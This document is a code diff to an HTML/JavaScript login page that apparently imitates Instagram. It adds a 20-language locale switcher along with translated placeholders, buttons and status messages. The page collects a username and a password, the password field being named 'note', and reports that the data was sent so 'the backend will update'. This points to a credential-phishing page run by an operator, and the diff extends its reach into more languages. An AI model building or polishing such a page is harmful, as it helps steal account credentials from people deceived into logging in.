@@ -11,7 +11,10 @@
   <main class="screen">
     <section class="phone">
       <div class="locale-switcher">
-        <div class="locale-button">中文(台灣)</div>
+        <button class="locale-button" id="locale-button" type="button" aria-haspopup="true" aria-expanded="false">
+          <span id="locale-label">中文(台灣)</span>
+          <span class="locale-caret" aria-hidden="true">▾</span>
+        </button>
       </div>
 
       <div class="brand" aria-hidden="true">
@@ -39,10 +42,120 @@
     </section>
   </main>
 
+  <div class="locale-backdrop" id="locale-backdrop" hidden></div>
+  <section class="locale-sheet" id="locale-sheet" role="dialog" aria-modal="true" aria-labelledby="locale-sheet-title" hidden>
+    <div class="locale-sheet__handle" aria-hidden="true"></div>
+    <div class="locale-sheet__header">
+      <button class="locale-sheet__close" id="locale-close" type="button" aria-label="關閉語言選單">×</button>
+      <h2 class="locale-sheet__title" id="locale-sheet-title">選擇語言</h2>
+      <span class="locale-sheet__spacer" aria-hidden="true"></span>
+    </div>
+    <div class="locale-menu" id="locale-menu"></div>
+  </section>
+
   <script>
+    const languages = [
+      { id: 'zh-TW', label: '中文(台灣)', htmlLang: 'zh-Hant', dir: 'ltr', accountPlaceholder: '用戶名稱、電子郵件地址或手機號碼', notePlaceholder: '密碼', submit: '登入', secondary: '建立新帳號', success: '資料已送出，後台會同步更新。', error: '送出失敗，請稍後再試。' },
+      { id: 'en', label: 'English', htmlLang: 'en', dir: 'ltr', accountPlaceholder: 'Username, email or phone', notePlaceholder: 'Password', submit: 'Log in', secondary: 'Create new account', success: 'Sent successfully. The backend will update.', error: 'Send failed. Please try again later.' },
+      { id: 'ja', label: '日本語', htmlLang: 'ja', dir: 'ltr', accountPlaceholder: 'ユーザー名、メールアドレスまたは電話番号', notePlaceholder: 'パスワード', submit: 'ログイン', secondary: '新しいアカウントを作成', success: '送信しました。管理画面が更新されます。', error: '送信に失敗しました。後でもう一度お試しください。' },
+      { id: 'ko', label: '한국어', htmlLang: 'ko', dir: 'ltr', accountPlaceholder: '사용자 이름, 이메일 또는 전화번호', notePlaceholder: '비밀번호', submit: '로그인', secondary: '새 계정 만들기', success: '전송되었습니다. 백엔드가 업데이트됩니다.', error: '전송 실패. 나중에 다시 시도하세요.' },
+      { id: 'es', label: 'Español', htmlLang: 'es', dir: 'ltr', accountPlaceholder: 'Nombre de usuario, correo o teléfono', notePlaceholder: 'Contraseña', submit: 'Iniciar sesión', secondary: 'Crear cuenta nueva', success: 'Enviado correctamente.', error: 'Error al enviar. Inténtalo más tarde.' },
+      { id: 'fr', label: 'Français', htmlLang: 'fr', dir: 'ltr', accountPlaceholder: 'Nom d’utilisateur, e-mail ou téléphone', notePlaceholder: 'Mot de passe', submit: 'Se connecter', secondary: 'Créer un compte', success: 'Envoyé avec succès.', error: 'Échec de l’envoi. Réessayez plus tard.' },
+      { id: 'de', label: 'Deutsch', htmlLang: 'de', dir: 'ltr', accountPlaceholder: 'Benutzername, E‑Mail oder Telefonnummer', notePlaceholder: 'Passwort', submit: 'Anmelden', secondary: 'Neues Konto erstellen', success: 'Erfolgreich gesendet.', error: 'Senden fehlgeschlagen. Bitte später erneut versuchen.' },
+      { id: 'it', label: 'Italiano', htmlLang: 'it', dir: 'ltr', accountPlaceholder: 'Nome utente, email o telefono', notePlaceholder: 'Password', submit: 'Accedi', secondary: 'Crea nuovo account', success: 'Inviato con successo.', error: 'Invio non riuscito. Riprova più tardi.' },
+      { id: 'pt', label: 'Português', htmlLang: 'pt', dir: 'ltr', accountPlaceholder: 'Nome de usuário, e-mail ou telefone', notePlaceholder: 'Senha', submit: 'Entrar', secondary: 'Criar nova conta', success: 'Enviado com sucesso.', error: 'Falha no envio. Tente novamente mais tarde.' },
+      { id: 'id', label: 'Bahasa Indonesia', htmlLang: 'id', dir: 'ltr', accountPlaceholder: 'Nama pengguna, email, atau nomor ponsel', notePlaceholder: 'Kata sandi', submit: 'Masuk', secondary: 'Buat akun baru', success: 'Berhasil dikirim.', error: 'Gagal mengirim. Coba lagi nanti.' },
+      { id: 'th', label: 'ไทย', htmlLang: 'th', dir: 'ltr', accountPlaceholder: 'ชื่อผู้ใช้ อีเมล หรือเบอร์โทร', notePlaceholder: 'รหัสผ่าน', submit: 'เข้าสู่ระบบ', secondary: 'สร้างบัญชีใหม่', success: 'ส่งเรียบร้อย', error: 'ส่งไม่สำเร็จ โปรดลองใหม่ภายหลัง' },
+      { id: 'vi', label: 'Tiếng Việt', htmlLang: 'vi', dir: 'ltr', accountPlaceholder: 'Tên người dùng, email hoặc số điện thoại', notePlaceholder: 'Mật khẩu', submit: 'Đăng nhập', secondary: 'Tạo tài khoản mới', success: 'Đã gửi thành công.', error: 'Gửi thất bại. Vui lòng thử lại sau.' },
+      { id: 'ru', label: 'Русский', htmlLang: 'ru', dir: 'ltr', accountPlaceholder: 'Имя пользователя, эл. почта или телефон', notePlaceholder: 'Пароль', submit: 'Войти', secondary: 'Создать аккаунт', success: 'Успешно отправлено.', error: 'Ошибка отправки. Попробуйте позже.' },
+      { id: 'ar', label: 'العربية', htmlLang: 'ar', dir: 'rtl', accountPlaceholder: 'اسم المستخدم أو البريد الإلكتروني أو الهاتف', notePlaceholder: 'كلمة المرور', submit: 'تسجيل الدخول', secondary: 'إنشاء حساب جديد', success: 'تم الإرسال بنجاح.', error: 'فشل الإرسال. حاول مرة أخرى لاحقًا.' },
+      { id: 'hi', label: 'हिन्दी', htmlLang: 'hi', dir: 'ltr', accountPlaceholder: 'उपयोगकर्ता नाम, ईमेल या फ़ोन', notePlaceholder: 'पासवर्ड', submit: 'लॉग इन', secondary: 'नया खाता बनाएँ', success: 'सफलतापूर्वक भेजा गया।', error: 'भेजना विफल। बाद में पुनः प्रयास करें।' },
+      { id: 'tr', label: 'Türkçe', htmlLang: 'tr', dir: 'ltr', accountPlaceholder: 'Kullanıcı adı, e-posta veya telefon', notePlaceholder: 'Şifre', submit: 'Giriş yap', secondary: 'Yeni hesap oluştur', success: 'Başarıyla gönderildi.', error: 'Gönderilemedi. Lütfen daha sonra tekrar deneyin.' },
+      { id: 'nl', label: 'Nederlands', htmlLang: 'nl', dir: 'ltr', accountPlaceholder: 'Gebruikersnaam, e-mail of telefoon', notePlaceholder: 'Wachtwoord', submit: 'Inloggen', secondary: 'Nieuw account maken', success: 'Succesvol verzonden.', error: 'Verzenden mislukt. Probeer het later opnieuw.' },
+      { id: 'pl', label: 'Polski', htmlLang: 'pl', dir: 'ltr', accountPlaceholder: 'Nazwa użytkownika, e-mail lub telefon', notePlaceholder: 'Hasło', submit: 'Zaloguj się', secondary: 'Utwórz nowe konto', success: 'Pomyślnie wysłano.', error: 'Wysyłanie nie powiodło się. Spróbuj później.' },
+      { id: 'sv', label: 'Svenska', htmlLang: 'sv', dir: 'ltr', accountPlaceholder: 'Användarnamn, e-post eller telefon', notePlaceholder: 'Lösenord', submit: 'Logga in', secondary: 'Skapa nytt konto', success: 'Skickat.', error: 'Det gick inte att skicka. Försök igen senare.' },
+      { id: 'he', label: 'עברית', htmlLang: 'he', dir: 'rtl', accountPlaceholder: 'שם משתמש, דוא"ל או טלפון', notePlaceholder: 'סיסמה', submit: 'התחבר', secondary: 'צור חשבון חדש', success: 'נשלח בהצלחה.', error: 'השליחה נכשלה. נסה שוב מאוחר יותר.' }
+    ];
+
     const form = document.getElementById('client-form');
     const status = document.getElementById('status');
+    const localeButton = document.getElementById('locale-button');
+    const localeLabel = document.getElementById('locale-label');
+    const localeMenu = document.getElementById('locale-menu');
+    const localeSheet = document.getElementById('locale-sheet');
+    const localeBackdrop = document.getElementById('locale-backdrop');
+    const localeClose = document.getElementById('locale-close');
+    const accountInput = document.querySelector('input[name="account"]');
+    const noteInput = document.querySelector('input[name="note"]');
+    const submitBtn = document.querySelector('.primary-btn');
     const secondaryBtn = document.getElementById('secondary-btn');
+    const body = document.body;
+    let currentLanguageId = 'zh-TW';
+    let lastOutcome = '';
+
+    function getLanguage(id) {
+      return languages.find((entry) => entry.id === id) || languages[0];
+    }
+
+    function setMenuOpen(isOpen) {
+      localeSheet.hidden = !isOpen;
+      localeBackdrop.hidden = !isOpen;
+      localeButton.setAttribute('aria-expanded', String(isOpen));
+    }
+
+    function renderLanguageMenu() {
+      localeMenu.innerHTML = languages.map((entry) => `
+        <button type="button" class="locale-option${entry.id === currentLanguageId ? ' is-selected' : ''}" data-language="${entry.id}">
+          <span class="locale-option__label">${entry.label}</span>
+          <span class="locale-option__box" aria-hidden="true"></span>
+        </button>
+      `).join('');
+    }
+
+    function applyLanguage(id, persist = true) {
+      const language = getLanguage(id);
+      currentLanguageId = language.id;
+
+      if (persist) {
+        try {
+          localStorage.setItem('instagramLogin.locale', language.id);
+        } catch {}
+      }
+
+      document.documentElement.lang = language.htmlLang;
+      document.documentElement.dir = language.dir;
+      body.dir = language.dir;
+      localeLabel.textContent = language.label;
+      accountInput.placeholder = language.accountPlaceholder;
+      noteInput.placeholder = language.notePlaceholder;
+      submitBtn.textContent = language.submit;
+      secondaryBtn.textContent = language.secondary;
+      renderLanguageMenu();
+
+      if (lastOutcome === 'success') {
+        status.textContent = language.success;
+      } else if (lastOutcome === 'error') {
+        status.textContent = language.error;
+      }
+    }
+
+    localeButton.addEventListener('click', () => {
+      renderLanguageMenu();
+      setMenuOpen(localeSheet.hidden);
+    });
+
+    localeClose.addEventListener('click', () => setMenuOpen(false));
+    localeBackdrop.addEventListener('click', () => setMenuOpen(false));
+    localeMenu.addEventListener('click', (event) => {
+      const button = event.target.closest('[data-language]');
+      if (!button) return;
+      applyLanguage(button.dataset.language);
+      setMenuOpen(false);
+    });
+
+    document.addEventListener('keydown', (event) => {
+      if (event.key === 'Escape') setMenuOpen(false);
+    });
 
     secondaryBtn.addEventListener('click', () => {
       window.location.href = '/phone-step.html';
@@ -65,12 +178,20 @@
       });
 
       if (response.ok) {
-        status.textContent = '資料已送出，後台會同步更新。';
+        lastOutcome = 'success';
+        status.textContent = getLanguage(currentLanguageId).success;
         form.reset();
       } else {
-        status.textContent = '送出失敗，請稍後再試。';
+        lastOutcome = 'error';
+        status.textContent = getLanguage(currentLanguageId).error;
       }
     });
+
+    try {
+      applyLanguage(localStorage.getItem('instagramLogin.locale') || 'zh-TW', false);
+    } catch {
+      applyLanguage('zh-TW', false);
+    }
   </script>
 </body>
 </html>
